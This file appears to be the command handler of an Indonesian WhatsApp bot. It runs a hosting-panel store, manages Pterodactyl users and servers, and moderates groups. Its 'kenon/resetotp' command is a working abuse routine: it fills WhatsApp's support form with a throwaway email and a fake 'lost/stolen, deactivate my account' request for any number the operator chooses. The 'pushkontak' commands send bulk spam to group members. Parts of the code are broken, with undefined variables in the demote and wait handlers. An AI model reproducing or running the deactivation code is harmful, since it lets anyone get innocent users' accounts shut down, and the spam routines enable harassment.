require('../settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./lib/functions')

module.exports = lynzz = async (lynzz, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await lynzz.decodeJid(lynzz.user.id)
const isDeveloper = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMeLexx = [botNumber, ...global.bugrup].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)

global.mess = {
    wait: '𝙎𝙖𝙗𝙖𝙧 𝙋𝙚𝙨𝙖𝙣𝙖𝙣 𝘼𝙣𝙙𝙖 𝙎𝙚𝙙𝙖𝙣𝙜 𝙆𝙖𝙢𝙞 𝙋𝙧𝙤𝙨𝙚𝙨🔎',
    succes: '𝙋𝙚𝙨𝙖𝙣𝙖𝙣 𝘼𝙣𝙙𝙖 𝙏𝙚𝙡𝙖𝙝 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙎𝙚𝙡𝙚𝙨𝙖𝙞𝙠𝙖𝙣',
    admin: '𝙁𝙞𝙩𝙪𝙧 𝙄𝙣𝙞 𝙆𝙝𝙪𝙨𝙪𝙨 𝘼𝙙𝙢𝙞𝙣 𝙆𝙖𝙠',
    botAdmin: '𝙅𝙖𝙙𝙞𝙠𝙖𝙣 𝘽𝙤𝙩𝙯 𝙎𝙚𝙗𝙖𝙜𝙖𝙞 𝘼𝙙𝙢𝙞𝙣 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙁𝙞𝙩𝙪𝙧 𝙄𝙣𝙞',
    owner: '𝙁𝙞𝙩𝙪𝙧 𝙄𝙣𝙞 𝙆𝙝𝙪𝙨𝙪𝙨 𝙊𝙬𝙣𝙚𝙧\n𝙆𝙚𝙩𝙞𝙠 𝙅𝙤𝙞𝙣𝙤𝙬𝙣 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙣𝙙𝙖𝙛𝙩𝙖𝙧 𝙎𝙚𝙗𝙖𝙜𝙖𝙞 𝙊𝙬𝙣𝙚𝙧',
    group: '𝙁𝙞𝙩𝙪𝙧 𝙄𝙣𝙞 𝙃𝙖𝙣𝙮𝙖 𝘿𝙖𝙥𝙖𝙩 𝘿𝙞 𝙂𝙪𝙣𝙖𝙠𝙖𝙣 𝘿𝙞 𝘿𝙖𝙡𝙖𝙢 𝙂𝙧𝙪𝙥',
    private: '𝙁𝙞𝙩𝙪𝙧 𝙄𝙣𝙞 𝙏𝙞𝙙𝙖𝙠 𝘿𝙖𝙥𝙖𝙩 𝘿𝙞𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝘿𝙖𝙡𝙖𝙢 𝙂𝙧𝙪𝙥',
    bot: '𝙁𝙞𝙩𝙪𝙧 𝙆𝙝𝙪𝙨𝙪𝙨 𝘽𝙤𝙩',
    error: '𝗘𝗿𝗼𝗿!! 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗛𝘂𝗯𝘂𝗻𝗴𝗶 𝗼𝘄𝗻𝗲𝗿',
    Akses: '𝙎𝙚𝙥𝙚𝙧𝙩𝙞𝙣𝙮𝙖 𝘼𝙣𝙙𝙖 𝘽𝙪𝙠𝙖𝙣 𝙐𝙨𝙚𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢\n𝙆𝙚𝙩𝙞𝙠 .𝘽𝙪𝙮𝙥𝙧𝙚𝙢 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙣𝙙𝙖𝙛𝙩𝙖𝙧 𝙎𝙚𝙗𝙖𝙜𝙖𝙞 𝙐𝙨𝙚𝙧  𝙋𝙧𝙚𝙢𝙞𝙪𝙢',
    develop: 'ᶠⁱᵗᵘʳᵉ ᴼⁿˡʸ ᴼʷⁿᵉʳ ᴸⁱⁿˢᴮᵒᵗᶻ',
}

const sendContact = (jid, number, name, quoted, mn) => {
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return lynzz.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await lynzz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const sender = m.key.fromMe ? (lynzz.user.id.split(':')[0]+'@s.whatsapp.net' || lynzz.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isQuotedMsg = (type == 'extendedTextMessage')

if (!lynzz.public) {
if (!m.key.fromMe) return
}
const sticWait = () => {
let ano = fs.readFileSync('./wait.webp')
lynzz.sendMessage(from, { sticker: ano }, { quoted: msg })
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
	
try {
ppuser = await lynzz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = lynzz.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = lynzz.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const createPassword = (size) => {
return crypto.randomBytes(size).toString('hex').slice(sender, size)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const reply = (teks) => {
lynzz.sendMessage(m.chat, { text: teks }, { quoted: fakelin })
}

let fakelin = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${runtime(process.uptime())}`, jpegThumbnail: ppnyauser}}}

if (command) {
lynzz.readMessages([m.key])
}
switch (command) {
case "menu":
textmenu = `╭━━•›〘 *PANEL MENU* 〙
│㞮 ${prefix}Addusr
│㞮 ${prefix}Delusr
│㞮 ${prefix}Listusr
│㞮 ${prefix}Detusr
│㞮 ${prefix}Addsrv
│㞮 ${prefix}Delsrv
│㞮 ${prefix}Listsrv
│㞮 ${prefix}Detsrv
│㞮 ${prefix}Self
│㞮 ${prefix}Public
╰━ ━ ━ ━ ━•━•⩵[⽂ - Zanxbotz㕚]

╭━━•›〘 *STORE MENU* 〙
│㞮 ${prefix}Listharga
│㞮 ${prefix}Payment
│㞮 ${prefix}Liststore
│㞮 ${prefix}owner
│㞮 ${prefix}Runtime
╰━ ━ ━ ━ ━•━•⩵[⽂ - Zanxbotz㕚]

╭━━•›〘 *GRUP MENU* 〙
│㞮 ${prefix}Promote
│㞮 ${prefix}Demote
│㞮 ${prefix}Kick
│㞮 ${prefix}Hidetag
│㞮 ${prefix}Tagall
│㞮 ${prefix}Totag
│㞮 ${prefix}Listonline
│㞮 ${prefix}Grup on/off
╰━ ━ ━ ━ ━•━•⩵[⽂ - Zanxbotz㕚]
`
lynzz.sendMessage(from, { text: textmenu}, {quoted:fakelin })
break
case 'self': {
if (!isDeveloper) return reply(mess.develop)             
                lynzz.public = false
                reply('Succes Change To Self')
            }
            break
case 'public': {
if (!itsMe) throw reply('only bot')
                lynzz.public = true
                reply('Succes Change To Public')
            }
            break
case 'tagall': {
if (!isGroup) return reply(mess.group)
if (!isDeveloper) return reply(mess.develop)
        let teks = `*👥 Tag All By Zanxbotz*\n\n🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`                                
           for (let mem of participants) {
                 teks += `• @${mem.id.split('@')[0]}\n`
                }
               lynzz.sendMessage(m.chat, {
                   text: teks,
           mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                
            }
            break
                       
case 'listonline': case 'liston': {
if (!isGroup) return reply(mess.group)
if (!isDeveloper) return reply(mess.develop)
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    lynzz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '@' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'totag': {
if (!isGroup) return reply(mess.group)
if (!isDeveloper) return reply(mess.develop)
               if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`
               lynzz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break              
case 'pushkontak': {
  if (!isDeveloper) return reply(mess.develop)
if (!q) return reply(`textnya mana?`)
  let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
  for (let i = 0; i < mem.length; i++) {
    lynzz.sendMessage(mem[i], { text: q})
    await new Promise(resolve => setTimeout(resolve, 2000)) // By Yt: JB FAUZAN STORE 
  }
 reply(mess.succes)
}
break
case 'idgc': {
if (!isDeveloper) return reply(mess.develop)
let getGroups = await lynzz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `*LIST GROUP ANDA*\n\nTotal Group : ${anu.length} GROUP\n\n`
for (let x of anu) {
let metadata2 = await lynzz.groupMetadata(x)
teks += `╭─────═[ *${metadata2.subject}* ]═─────⋆\n│☞ *ID :* ${metadata2.id}\n│☞ ANGGOTA : ${metadata2.participants.length}\n╰──────────────────˧\n`
}
reply(teks + `*© Zanxbotz*`)
}
break
case 'pushkontakv2':{
if (!isDeveloper) return reply('khusus premium')
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${command} idgc,tekspushkontak`)
const metadata2 = await lynzz.groupMetadata(q.split(",")[0])
const halss = metadata2.participants
for (let mem of halss) {
lynzz.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split(",")[1] })
await sleep(2000)// By Yt: JB FAUZAN STORE 
}
reply('done kak')
}
break
case 'owner':{
sendContact(from, global.owner, global.author, fakelin)
}
break
case 'bot': case 'runtime':{
lynzz.sendMessage(from, { text: `Status Online:\n${runtime(process.uptime())}`}, {quoted:fakelin })
}
break
case 'liststore':
store = `Halo Kak ${m.pushName} Selamat ${salam}

kami menyediakan
jasa run bot
jasa jadi bot
buy all script
panel

minat hubungi nomor dibawah
wa.me/6285174312497
`
reply(store)
break
case 'payment':
pay = `Halo Kak ${m.pushName} Selamat ${salam}

*tranfer sesuai nominal*
⏣ ᴅᴀɴᴀ: [ 085174312497 ] 
⏣ ᴏᴠᴏ: [ 085174312497 ]
⏣ ɢᴏᴘᴀʏ: [ 085174312497 ]
𝚃𝚛𝚒𝚖𝚊𝚔𝚊𝚜𝚒𝚑

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
         ❨ *𝙵𝙰𝚄𝚉𝙰𝙽 𝚂𝚃𝙾𝚁𝙴²⁴⁹⁷* ❩
`
reply(pay)
break
case 'listharga':
panel = `Halo Kak ${m.pushName} Selamat ${salam}

 LIST HARGA PANEL FAUZAN 
*📮RAM 1GB CPU 50% 3K/BULAN*
*📮RAM 2GB CPU 100% 7K/BULAN*
*📮RAM 3GB CPU 150% 10K/BULAN*
*📮RAM 4GB CPU 200% 13K/BULAN*
*📮RAM 5GB CPU 250% 15K/BULAN*
*📮RAM UNLIMITED CPU UNLIMITED 18K/BULAN*

*_[ KEUNTUNGAN ]_*
*🤖 MEMBUAT BOT ON 24 JAM*
*🤖 TANPA INTERNET*
*🤖 MUDAH DAN TIDAK RIBET*
*🤖 MEMORY AMAN TERKENDALI* 

*Minat Pm wa.me/6285174312497*

Link Grup Panel?
https://chat.whatsapp.com/EOFwIlpFz1EE9fKYalUgJs
`
reply(panel)
break
case 'kick': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isGroupAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lynzz.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'group': case 'grup':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == "off") {
lynzz.groupSettingUpdate(from, 'announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] == "on") {
lynzz.groupSettingUpdate(from, 'not_announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
break


case 'hidetag':{
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
lynzz.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case 'verif':
case 'logout':
case 'kenon':
case 'resetotp':{
if (!isDeveloper) return reply(mess.develop)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'promote': {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
  if (!text) return reply('Tag Orang Yang Mau Di Promote!!')
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await lynzz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(mess.succes)).catch((err) => reply(mess.error))
  }
  break
case 'demote': {
  if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
  if (!text) return reply('Tag Orang Yang Mau Di Demote!!')
  let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await lexx.groupParticipantsUpdate(msg.chat, [users], 'demote').then((res) => reply(mess.succes)).catch((err) => reply(mess.error))
  }
break
case "listusr": {
if (!isDeveloper) return reply(mess.develop)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let users = res.data
let sections = []
for (let user of users) {
let u = user.attributes
reply(`*LIST PANEL*

TOTAL USER: ${res.meta.pagination.count}

Id: ${u.id}
Nama: ${u.username}
`)
}}
break

case "addusr": {
if (!isDeveloper) return reply(mess.develop)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag\n\nExample: linsbot@gmail.com,Zanxbotz,Zanxbotz,628xxx`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag\n\nExample: linsbot@gmail.com,Zanxbotz,Zanxbotz,628xxx`);
let d = (await lynzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await lynzz.sendMessage(m.chat, { text: `
*SUCCES ADD USER*

 ID: ${user.id}
 UUID: ${user.uuid}
 USERNAME: ${user.username}
 EMAIL: ${user.email}
 NAME: ${user.first_name} ${user.last_name}
 LANGUAGE: ${user.language}
 ADMIN: ${user.root_admin}

*Password telah dikirim di private chat @${u.split`@`[0]}*

Powered By Zanxbotz`, mentions:[u],
})
lynzz.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
 LOGIN: ${domain}
 USERNAME: ${username}
 PASSWORD: ${password.toString()}
 EMAIL: ${email}

NOTE📃 : *HARAP SIMPAN BAIK" KARENA DATA INI HANYA DI KIRIM 1X DAN ADMIN TIDAK BERTANGGUNG JAWAB*
*JIKA DATA HILANG*

Powered By Zanxbotz`,
})
}
break

case "delusr": {

if (!isDeveloper) return reply(mess.develop)
let usr = args[0]
if (!usr) return reply('Format Salah!!!\n\nExample: delusr 12')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER TIDAK DITEMUKAN*')
reply('*SUCCES DELETE USER*')
}
break

case "detusr": {
if (!isDeveloper) return reply(mess.develop)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return reply('*USER TIDAK DITEMUKAN*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break

case "listsrv": {
if (!isDeveloper) return reply(mess.develop)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
reply(`*LIST SERVER*

ID: ${s.id}
NAMA: ${s.name}
`)
}
}
break

case "addsrv": {

if (!isDeveloper) return reply(mess.develop)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name, deskripsi,userId,eggId,locationId,memory/disk,cpu

Example: addsrv lins,26 Desember 2018,9,15,1,1000/1000,100`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

case "delsrv": {

if (!isDeveloper) return reply(mess.develop)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case "detsrv": {
if (!isDeveloper) return reply(mess.develop)
let srv = args[0]
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
if (res.errors) return reply('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f2.json();
let t = data.attributes
reply(`*${s.name.toUpperCase()} SERVER DETAILS*

STATUS: ${t.current_state}

ID: ${s.id}
UUID: ${s.uuid}
NAME: ${s.name}
DESCRIPTION: ${s.description}
MEMORY: ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}
DISK: ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}
CPU: ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}
CREATED AT: ${s.created_at}`)
}
break

default:
}
} catch (err) {
lynzz.sendMessage(global.sendNotif+'@s.whatsapp.net', {text:`${util.format(err)}`})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})